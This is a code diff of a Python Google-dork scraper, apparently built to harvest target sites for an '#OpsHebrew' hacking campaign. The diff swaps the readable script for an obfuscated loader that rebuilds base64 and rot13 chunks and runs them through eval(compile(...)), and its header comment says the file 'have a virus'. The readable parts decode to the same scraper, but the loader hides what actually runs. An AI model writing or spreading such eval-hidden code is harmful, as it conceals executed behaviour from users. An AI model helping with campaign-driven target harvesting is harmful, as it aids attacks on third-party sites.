@@ -1,49 +1,11 @@
 # CODER: 0xCoolAnon
 # This file have a virus
 
-from googlesearch import search
-from colorama import Fore
-import os
-
-def banners():
-    print()
-    print(Fore.LIGHTWHITE_EX + "       ░█████╗░░██████╗  ░█████╗░██████╗░███████╗░██╗░░░░░░░██╗")
-    print(Fore.LIGHTWHITE_EX + "       ██╔══██╗██╔════╝  ██╔══██╗██╔══██╗██╔════╝░██║░░██╗░░██║")
-    print(Fore.LIGHTWHITE_EX + "       ██║░░╚═╝╚█████╗░  ██║░░╚═╝██████╔╝█████╗░░░╚██╗████╗██╔╝")
-    print(Fore.LIGHTWHITE_EX + "       ██║░░██╗░╚═══██╗  ██║░░██╗██╔══██╗██╔══╝░░░░████╔═████║░")
-    print(Fore.LIGHTWHITE_EX + "       ╚█████╔╝██████╔╝  ╚█████╔╝██║░░██║███████╗░░╚██╔╝░╚██╔╝░")
-    print(Fore.LIGHTWHITE_EX + "       ░╚════╝░╚═════╝░  ░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░")
-    print(Fore.YELLOW + "══════════════════╦═══════════════════════════╦═══════════════════")
-    print(Fore.YELLOW + "      ╔════════════╩═══════════════════════════╩════════════╗")
-    print(Fore.YELLOW + "      ║ • " + Fore.GREEN + "CODER " + Fore.RED + "   |" + Fore.LIGHTYELLOW_EX + "           0xCOOLANON                  " + Fore.YELLOW + " ║")
-    print(Fore.YELLOW + "      ║ • " + Fore.GREEN + "GITHUB " + Fore.RED + "  |" + Fore.LIGHTYELLOW_EX + "      GITHUB.COM/0XCOOLANON            " + Fore.YELLOW + " ║")
-    print(Fore.YELLOW + "      ╚═════════════════════════════════════════════════════╝")
-
-banners()
-try:
-    # Prompt the user for inputs
-    ny1 = input(f"{Fore.YELLOW}\n[💀] #OpsHebrew [💀]{Fore.RED} - {Fore.GREEN}Dork: {Fore.CYAN}")
-    ny2 = int(input(f"{Fore.YELLOW}\n[💀] #OpsHebrew [💀]{Fore.RED} - {Fore.GREEN}Amount: {Fore.CYAN}"))
-    ny3 = int(input(f"{Fore.YELLOW}\n[💀] #OpsHebrew [💀]{Fore.RED} - {Fore.GREEN}Time (Seconds): {Fore.CYAN}"))
-    custom_file_name = input(f"{Fore.YELLOW}\n[💀] #OpsHebrew [💀]{Fore.RED} - {Fore.GREEN}File Name You Want to Create: {Fore.CYAN}")
-    print(f'{Fore.BLUE}\n═════════════════════════════════════════════')
-
-    result = "result"  # Specify the name of the directory
-    os.makedirs(result, exist_ok=True)
-    custom_file_path = os.path.join('result', custom_file_name)
-
-    nyx = 0
-    for i in search(ny1, lang="en", num=int(ny2), start=0, stop=None, pause=int(ny3)):
-        with open(custom_file_path, 'a') as f:
-            f.write(f'{i}\n')
-        nyx += 1
-        print(f'{Fore.WHITE}       {nyx}) {Fore.CYAN}{i}')
-        if nyx >= int(ny2):
-            break
-
-    print(f'{Fore.BLUE}═════════════════════════════════════════════')
-    print(f'{Fore.YELLOW}\n[D0rK!] {Fore.GREEN}Saved: {Fore.GREEN}{custom_file_path}')
-except ValueError:
-    exit(f'{Fore.RED}Exit! Input error')
-except KeyboardInterrupt:
-    exit(f'\n\n{Fore.RED}Exit!')
+import base64, codecs
+magic = 'ZnJvbSBnb29nbGVzZWFyY2ggaW1wb3J0IHNlYXJjaA0KZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZQ0KaW1wb3J0IG9zDQoNCmRlZiBiYW5uZXJzKCk6DQogICAgcHJpbnQoKQ0KICAgIHByaW50KEZvcmUuTElHSFRXSElURV9FWCArICIgICAgICAg4paR4paI4paI4paI4paI4paI4pWX4paR4paR4paI4paI4paI4paI4paI4paI4pWX4oCD4oCD4paR4paI4paI4paI4paI4paI4pWX4paR4paI4paI4paI4paI4paI4paI4pWX4paR4paI4paI4paI4paI4paI4paI4paI4pWX4paR4paI4paI4pWX4paR4paR4paR4paR4paR4paR4paR4paI4paI4pWXIikNCiAgICBwcmludChGb3JlLkxJR0hUV0hJVEVfRVggKyAiICAgICAgIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKAg+KAg+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWkeKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVl+KWkeKWkeKWiOKWiOKVkSIpDQogICAgcHJpbnQoRm9yZS5MSUdIVFdISVRFX0VYICsgIiAgICAgICDilojilojilZHilpHilpHilZrilZDilZ3ilZrilojilojilojilojilojilZfilpHigIPigIPilojilojilZHilpHilpHilZrilZDilZ3ilojilojilojilojilojilojilZTilZ3ilojilojilojilojilojilZfilpHilpHilpHilZrilojilojilZfilojilojilojilojilZfilojilojilZTilZ0iKQ0KICAgIHByaW50KEZvcmUuTElHSFRXSElURV9FWCArICIgICAgICAg4paI4paI4pWR4paR4paR4paI4paI4pWX4paR4pWa4pWQ4pWQ4pWQ4paI4paI4pWX4oCD4oCD4paI4paI4pWR4paR4paR4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWd4paR4paR4paR4paR4paI4paI4paI4paI4pWU4pWQ4paI4paI4paI4paI4pWR4paRIikNCiAgICBwcmludChGb3JlLkxJR0hUV0hJVEVfRV'
+love = 'ttXlNvVPNtVPNtVBXIzhXJvBXJvBXJvBXJvBXJvBXIyBXIarXJvBXJvBXJvBXJvBXJvBXJvBXIyBXIarXNt+XNt+XIzhXJvBXJvBXJvBXJvBXJvBXIyBXIarXJvBXJvBXIxrXJxrXJxrXJvBXJvBXIxrXJvBXJvBXJvBXJvBXJvBXJvBXJvBXIy+XJxrXJxrXIzhXJvBXJvBXIyBXIarXJxrXIzhXJvBXJvBXIyBXIarXJxFVcQDbtVPNtpUWcoaDbEz9lMF5ZFHqVISqVFIESK0ILVPftVvNtVPNtVPQvycUvyMevyMQvyMQvyMQvyMQvyM3vycUvyMevyMQvyMQvyMQvyMQvyMQvyM3vycUvtVCvtVCvycUvyMevyMQvyMQvyMQvyMQvyM3vycUvyMevyMQvyM3vycUvycUvyMevyMQvyM3vyMevyMQvyMQvyMQvyMQvyMQvyMQvyM3vycUvycUvycUvyMevyMQvyM3vycUvycUvycUvyMevyMQvyM3vycUvycRvXD0XVPNtVUOlnJ50XRMipzHhJHIZGR9KVPftVhXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIchXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIchXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxPVcQDbtVPNtpUWcoaDbEz9lMF5MEHkZG1ptXlNvVPNtVPNt4cJH4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJc4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJc4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJKVvxAPvNtVPOjpzyhqPuTo3WyYyySGRkCIlNeVPVtVPNtVPQvyMRt4bPvVPVtXlOTo3WyYxqFEHIBVPftVxACERIFVPVtXlOTo3WyYyWSEPNeVPVtVPO8VvNeVRMipzHhGRyUFSEMEHkZG1qsEIttXlNvVPNtVPNtVPNtVPNjrRACG0kOGx9BVPNtVPNtVPNtVPNtVPNtVPNtVvNe'
+god = 'IEZvcmUuWUVMTE9XICsgIiDilZEiKQ0KICAgIHByaW50KEZvcmUuWUVMTE9XICsgIiAgICAgIOKVkSDigKIgIiArIEZvcmUuR1JFRU4gKyAiR0lUSFVCICIgKyBGb3JlLlJFRCArICIgIHwiICsgRm9yZS5MSUdIVFlFTExPV19FWCArICIgICAgICBHSVRIVUIuQ09NLzBYQ09PTEFOT04gICAgICAgICAgICAiICsgRm9yZS5ZRUxMT1cgKyAiIOKVkSIpDQogICAgcHJpbnQoRm9yZS5ZRUxMT1cgKyAiICAgICAg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIikNCg0KYmFubmVycygpDQp0cnk6DQogICAgIyBQcm9tcHQgdGhlIHVzZXIgZm9yIGlucHV0cw0KICAgIG55MSA9IGlucHV0KGYie0ZvcmUuWUVMTE9XfVxuW/CfkoBdICNPcHNIZWJyZXcgW/CfkoBde0ZvcmUuUkVEfSAtIHtGb3JlLkdSRUVOfURvcms6IHtGb3JlLkNZQU59IikNCiAgICBueTIgPSBpbnQoaW5wdXQoZiJ7Rm9yZS5ZRUxMT1d9XG5b8J+SgF0gI09wc0hlYnJldyBb8J+SgF17Rm9yZS5SRUR9IC0ge0ZvcmUuR1JFRU59QW1vdW50OiB7Rm9yZS5DWUFOfSIpKQ0KICAgIG55MyA9IGludChpbnB1dChmIntGb3JlLllFTExPV31cblvwn5KAXSAjT3BzSGVicmV3IFvwn5KAXXtGb3JlLlJFRH0gLSB7Rm9yZS5HUkVFTn1UaW1lIChTZWNvbmRzKToge0ZvcmUuQ1lBTn0iKSkNCiAgICBjdXN0b21fZmlsZV9uYW1lID0gaW5wdXQoZiJ7Rm9yZS5ZRUxMT1d9XG5b8J+SgF0gI09wc0hlYnJldyBb8J+SgF17Rm9yZS5SRUR9IC0ge0ZvcmUuR1JFRU59RmlsZSBOYW1lIFlvdSBXYW50IHRvIENyZWF0ZToge0ZvcmUuQ1lBTn0iKQ0KICAgIHByaW50KGYne0ZvcmUuQkxVRX1cbuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkO'
+destiny = 'XIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxPpcQDbAPvNtVPOlMKA1oUDtCFNvpzImqJk0VvNtVlOGpTIwnJM5VUEbMFOhLJ1yVT9zVUEbMFOxnKWyL3EipaxAPvNtVPOipl5gLJgyMTylplulMKA1oUDfVTI4nKA0K29eCIElqJHcQDbtVPNtL3ImqT9gK2McoTIspTS0nPN9VT9mYaOuqTthnz9covtapzImqJk0WljtL3ImqT9gK2McoTIsozSgMFxAPt0XVPNtVT55rPN9VQNAPvNtVPOzo3VtnFOcovOmMJSlL2tboaxkYPO0oTD9VzAioFVfVTkuozp9VzIhVvjtoaIgCJyhqPuhrGVcYPOmqTSlqQ0jYPOmqT9jCH5iozHfVUOuqKAyCJyhqPuhrGZcXGbAPvNtVPNtVPNtq2y0nPOipTIhXTA1p3EioI9znJkyK3OuqTtfVPquWlxtLKZtMwbAPvNtVPNtVPNtVPNtVTLhq3WcqTHbMvq7nK1povpcQDbtVPNtVPNtVT55rPNeCFNkQDbtVPNtVPNtVUOlnJ50XTLar0MipzHhI0uWIRI9VPNtVPNtVUghrKu9XFO7Ez9lMF5QJHSBsKgcsFpcQDbtVPNtVPNtVTyzVT55rPN+CFOcoaDboaxlXGbAPvNtVPNtVPNtVPNtVTWlMJSeQDbAPvNtVPOjpzyhqPuzW3gTo3WyYxWZIHI94cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJD4cJDWlxAPvNtVPOjpzyhqPuzW3gTo3WyYyySGRkCI31poygRZUWYVI0tr0MipzHhE1WSEH59H2S2MJD6VUgTo3WyYxqFEHIBsKgwqKA0o21sMzyfMI9jLKEbsFpcQDcyrTAypUDtIzSfqJISpaWipwbAPvNtVPOyrTy0XTLar0MipzHhHxIRsHI4nKDuVRyhpUI0VTIlpz9lWlxAPzI4L2IjqPOYMKyvo2SlMRyhqTIlpaIjqQbAPvNtVPOyrTy0XTLaKT5poagTo3WyYyWSEU1SrTy0VFpc'
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
